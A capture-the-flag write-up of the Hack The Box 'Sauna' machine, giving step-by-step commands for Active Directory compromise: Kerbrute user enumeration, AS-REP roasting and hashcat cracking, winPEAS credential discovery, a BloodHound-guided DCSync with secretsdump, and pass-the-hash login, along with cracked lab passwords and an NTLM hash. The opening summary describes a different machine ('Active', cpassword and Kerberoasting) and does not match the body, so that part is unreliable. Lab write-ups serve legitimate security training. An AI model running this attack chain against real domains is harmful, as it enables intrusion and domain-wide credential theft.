
Active is an easy machine from Hack The Box that focuses on Active Directory enumeration and common domain misconfigurations. The attack begins with SMB enumeration, where anonymous access reveals a readable share containing a replica of the SYSVOL directory. Inside this share, a Groups.xml file is discovered with an embedded cpassword, which is decrypted to obtain valid domain user credentials. With this access, Kerberoasting is performed, revealing that the Administrator account has an SPN assigned, allowing extraction of a service ticket that can be cracked offline. After recovering the administrator password, full domain compromise is achieved, enabling credential dumping and obtaining a SYSTEM shell on the Domain Controller.


# Enumeration

Enumeration phase begins with a open ports scan, i use `rustscan` as it produces quick results. The command for executing the scan looks as follows : 

```bash
> rustscan -a 10.129.2.204 --ulimit 5000
```

![[Sauna-rustsacn-1.png)

The initial output revels open ports , `53` , `80` , `88` , `135` , `139` , `389` , `445` , `464` , `593` ,`3268` , `5985` , `9389` And some higher ports. Lets use `nmap` to run a version detection (Using `-sV`) and use `nmap` capabilities as a script engine to run a script on each port to extract extra information(Using `-sC`).

```bash
> sudo nmap -p 53,80,88,135,139,389,445,464,593,3268,5985 -sCV -oN sauna.nmap
```

![[Sauna-nmap-1.png)

Lets review the `nmap` output. port `53` and `88` (Also `464`) indicates this is a kerberos server (AKA `KDC`) and also `LDAP` server, this machine has `smb` port open which we can check if they misconfigured to allow access no anonymous users. Also this machine is running a web server on port `80`. I believe we have every right to infer this machine plays the role of a `DC`, so we will keep that in mind through out the rest of the assessment.



#### Using enum4linux-NG

`enum4linux-ng` is a known tool that collect data from windows systems, it combines several enumeration techniques like searching for anonymous access to different services (`smb`,`ldap` ,`rpc`), running querys against these services and more...

```bash
> enum4linux-ng -A 10.129.2.204
```

![[Sauna-enum4linux-1.png)

This machine isnt configured to allow any anonymous bind with any service , also the `smb` and windows version looks find and pretty much up to date. We did extract some information about the computer name `sauna` and the domain name `EGOTISTICAL-BANK.LOCAL` 

![[Sauna-enum4linux-2.png)


## Port 80 - IIS 10.0

Egotistical Bank website is presented on the server. There are links to other `html` pages presented on the top of the page.

![[Sauna-index,php.png)


Scrolling all the way down we can confirm this is a static `html` page, we also see all the links presented in the page point to an `html` page. 

![[Sauna-html.png)

Other then that we find this `leave a reply` field but this generate nothing.

![[Sauna-no-interaction.png)
### Running Directory Busting

Before digging into each page lets simulate crawling, by using `ffuf` a fuzzing tool to list all accessible endpoints, we expand the regular search by looking for `html` files in addition to plain directory names, we can do it by adding the `-e` flag (Stands for extensions)   

```bash
> ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://10.129.2.204/FUZZ -e .html
```

Which returns the following output 

![[Sauna-ffuf-2.png)

As of now we can confirm an attack surface of 

* `index.html`
* `blog.html`
* `single.html`
* `about.html`
* `contact.html`
* `fonts`
* `css`
* `images`

Each page reviewed presented a plain html content without any interesting input fields or something to play with. The apply now box forwards to `contact.html` which isnt allowing to apply anything.

### About.html

![[Sauna-about.html-1.png)

The `about.html` page reveals a list of company employers names, we can use this information to potentially get a valid user on this machine. With this machine  also being the DC there is a high chance that these employs also  have users as part of the domain, in the next section we will see how we can maneuver this information through the kerberos protocol to get a valid user name.


![[Sauna-about.html-2.png)



## Kerbrute: How to validate a user using the kerberos protocol

The kerberos protocol is a authentication mechanism implemented in Microsoft systems, without getting too deep into the subject, the `KDC` which is the server that handles the authentication logic (in this case this machine) returns different error messages  for `wrong password` and for `user do not exist`, by knowing this we can brute force the authentication process until we find a user that returns `wrong password`, so we know this user is real.

Before we can run this scan we need create a user list, naturally a user name isnt directly the name of the employee, each company has its own **name convention** for users, for the sake of order and organization will apply the same naming convention across all user. For example it means that all users will be named first name a dot and the first letter of the last name, or first three letter of first name underscore first three letters of last name. 

### Creating a users list

We will use `username-anarchy`, a tool that generate several potential user names from a full name, it creates a patterns of all the most used **user naming conventions** and apply it on each name inserted, the result is a new list of real usernames we can test against the kerberos protocol.

First lets create a list of full names.

![[Sauna-names-1.png)

Execute the `username-anarcy` tool and redirect the output to a potential users file:

```bash
> username-anarchy -i names > pot_users
```

We can reflect on the output:

![[Sauna-pot_names-1.png)

### Using Kerbrute

The `kerbrute` tool comes with the `userenum` module that allows us to insert usernames as input and automate the process of sending the requests and comparing the results. Run the following command, specify the domain with `-d` the the ip adress at `--dc`

```bash
> kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.2.204 pot_users
```

![[Sauna-kerbrute-1.png)

It return a valid username `fsmith`, nice!

Brute forcing this user now sound too excessive to me  as i have no information about the password policy, as this is a domain environment, we can check if this user has `asrep` don't require password enabled.


## AS-REP roasting

The kerberos protocol enforce validation to services utilizing a `TGT`, a ticket that represent the user status and its rights and permissions, to obtain the a `tgt` a one time authentication must  happen, in kerberos a user can be configured in a way where the user is not required to enter  a password when conducting the authentication. This `TGT` is encrypted with the user hash. Which can be extracted and then put to a offline cracking campaign.   

Using `impacket-GetNPUsers` we can check if our user `f.smith` is configured in this way, in case it does it will automatically return the user hash, which we can later try to crack using `hashcat`. 

```bash
> impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith -dc-ip 10.129.2.204 -no-pass
```

![[Sauna-impacket-get-npusers-1.png)

Running the tool confirmed the user `f.smith` is configured with `Do not require Kerberos pre-authentication` and we can get the user hash, this can be cracked offline using hashcat.

### Offline Cracking 

Hashes collected throughout the assessment can be captured and cracked offline. Hashes are always created via a one way algorithm, meaning the hash can not be reversed into a password, by utilizing a big wordlist we can hash each string with the same algorithm and compare both hashes. The process of cracking can take a lot time and if the password restrictions are good we may not even be able to crack the hash at all with a normal wordlist.

Lets start by copying the hash to a file using `echo`

```bash
> echo '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:2a24d0bf2fb896461e17ca4fe50e7dc6$456afb6b92c000f4cb41c98cfe6e5dbfb0fcce224f487b902fb85d9be767608e2b36b2993f36cf440fb9b2fa5d96db145f5e883701dfab3ad1f9311aa17f27d713fde2b43c15478a5a80ff35aaf9f.....' > hash
```

![[Sauna-hash-1.png)

Password cracking can be performed with a lot of tools, for this matter i chose `hashcat` , we must specify the hash type (`-m 18200`) for kerberos `AS-REP` hashes. Check it by your self by traveling to [Hashcat Examples](https://hashcat.net/wiki/doku.php?id=example_hashes) and searching for `ASREP`.Our first choice of a wordlist will be `rockyou` , most of the times in these CTF its enough. 
 
```bash
> hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```


![[Sauna-hashcat-1.png)

The password can be cracked using the `rockyou` wordlist to the password `Thestrokes23`


```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:2a24d0bf2fb896461e17ca4fe50e7dc6$456afb6b92c000f4cb41c98cfe6e5dbfb0fcce224f487b902fb85d9be767608e2b36b2993f36cf440fb9b2fa5d96db145f5e883701dfab3ad1f9311aa17f27d713fde2b43c15478a5a80ff35aaf9f108694f5177300b1eed8b345ba1708cd8bd46f4c1ada3827bbc3bb4139e35eb117325374149d95e47925840416a236a895a815c7ccdcd8e2a227eb56014b3f8f4a410f45fc81537e58347be60d9c82891a3791604e2c6572fd1430f66fda915889c22f5b3b6d8280153e62bb6117763623db8b25866e85e16ce2988fdef45b271872e426c5345243b1ad5c4d8e307899556e90e4b0728b77e8933608def3bca647bffcbae666df784d5ab12ef7bc6a69b9a:Thestrokes23
```


![[Sauna-hashcat-2.png)


Lets confirm the user is valid using `netexec`.

```bash
> nxc smb 10.129.2.204 -u 'fsmith' -p 'Thestrokes23'
```


![[Sauna-user-validation.png)

**Enumeration Summarize :** We first started the assessment with a port scan which actually set the tone for the rest of the assessment, we confirmed this was a kerberos server (`kdc`) and by reviewing the `about` page in the website we were able to make a potential user list which was set to test against the `kdc` in a **kerbrute** attack. We found a valid username and using trial and error the user found do be vulnerable to `as-rep roasting` resulting with the gathering of a  user hash which was crack-able using a normal wordlist. By the end of this phase we are founding our self with a valid user using almost only pure enumeration techniques. 


## Initial Connection

`netexec` confirms the user is valid, we remember this machine has winrm port open for connection, lets check if our user has winrm privileges on this machine.

```bash
> nxc winrm 10.129.2.204 -u 'fsmith' -p 'Thestrokes23'
```



And we can connect to the machine using `evil-winrm` a winrm client for linux.

```bash
> evil-winrm -i 10.129.2.204 -u fsmith -p Thestrokes23
```



## Post Exploitation


### Running PrivEsc script to fins stored credentials

We can utilize the upload functionality which is built in evil winrm to upload `winpeas`. **winpeas** is a privilege escalation  automation script , the equivalent to `linpeas` we saw at `bashed`.

Upload the script using this command :

```
upload winPEASx64.exe
```

![[Sauna-upload-winpeas-1.png)

And execute the binary:

![[Sauna-winpeas-1.png)

Reviewing the script reveals this stored credentials :

![[Sauna-winpeas-2.png)

Lets Validate the user : 

```bash
> nxc smb 10.129.2.204 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

![[Sauna-nxc-2.png)

## Domain Privilege escalation : DCSync Attack  
### Using Bloodhound to find on `svc_manager`

This service user is still not an administrative user, but it is indeed a service user, which most of the time **is** granted with special privileges. Lets use bloodhound to visualize  relationships between objects in AD.

#### BloodHound

Bloodhound is a popular tool that visualize user permissions in a way that its easy to understand the attack path. By using bloodhound we can see which user has what permission over what object with visual objects and arrows, also it shares a lot of information about the vulnerabilities it finds and how to exploit them, first we use a `bloodhound - injector` a tool that by using `LDAP` query's and other tricks collect all the information in a zip file that can later be uploaded to the bloodhound GUI server.


We can start the process with `bloodhound-python` which is a remote injector for linux, to be able perform such scan we must have a valid user that can authenticate to the machine, we have 2 users right now which will return almost if not the same output. 

```bash
> bloodhound-python -d EGOTISTICAL-BANK.LOCAL -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'  -c All --zip -ns 10.129.95.180
```

![[Sauna-bloodhound-python-1.png)

As we can see the tool collected a lot of information and compressed it into a one zip file, which will now be uploaded to bloodhound server.


Open bloodhound by running :

```bash
> bloodhound
```

and your enter credentials : 

![[Sauna-bloodhound-1.png)


After loging in we will have to upload the data to bloodhound, we scroll the the left menu and select quick upload.


![[Sauna-bloodhound-2.png)

Select your zip file and click upland.

![[Sauna-bloodhound-2-1.png)

Confirm that the file uploaded successfully (Administration -> file injest)  

![[Sauna-bloodhound-3.png)


Return to the start menu and on the search field search for the user `svc_loanmgr` , we can add this user to our owned, if we will need it will help us automate future querys.


![[Sauna-bloodhound-4.png)


On the right we can see a menu for each object selected, we can see information about out currently selected object `svc_loanmgr`, we can see this user has an outbound object control, this means this user has some permission over other object, this will help us moving laterally in the domain or even elevate privileges. 

![[Sauna-bloodhound-5.png)


By clicking on `outbound object control` we will be presented with the next graph, as we can see the user we control has `getChangesAll` which allow our user to perform DCSync attack.

![[Sauna-bloodhound-6.png)


### DCSync Attack

DCSynx attack is an attack performed as persistence and some time even to elevate privileges, by using different permissions that eventually allow the same thing, a user (With these permissions) can copy the whole domain data, this contains password hashes for all user including the Domain administrator password.

In bloodhound, if we click on the name of the permission on the right we will see this menu with explanations about the vulnerability and how to abuse it from both linux and windows machine, for linux it is recommending to use `secretsdump`.


![[Sauna-bloodhound-7.png)


From our attack machine we can execute the following command to drop all `NTLM` hashes in the domain, these can be put to Pass the Hash attack.

```bash
> impacket-secretsdump EGOTISTICAL-BANK.LOCAL/'svc_loanmgr':'Moneymakestheworldgoround!'@10.129.95.180
```

The whole domain got dumped : 

![[Sauna-secretsdump-1.png)





### Pass The hash attack

In windows domain environments we can use the hash for authentication instead of a password, if we found an **NTLM** hash it can be reusable using tools that support this feature. This can be helpful if we can not crack the hash, or if we have no need in it. in this case we have the administrator hash which pretty much ends the assessment, no further assumption need to happen. 


Using the administrator hash to connect via `evil-winrm`

```bash
> evil-winrm -i 10.129.95.180 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

The flag can be found on the administrator Desktop

![[Sauna-flag.png)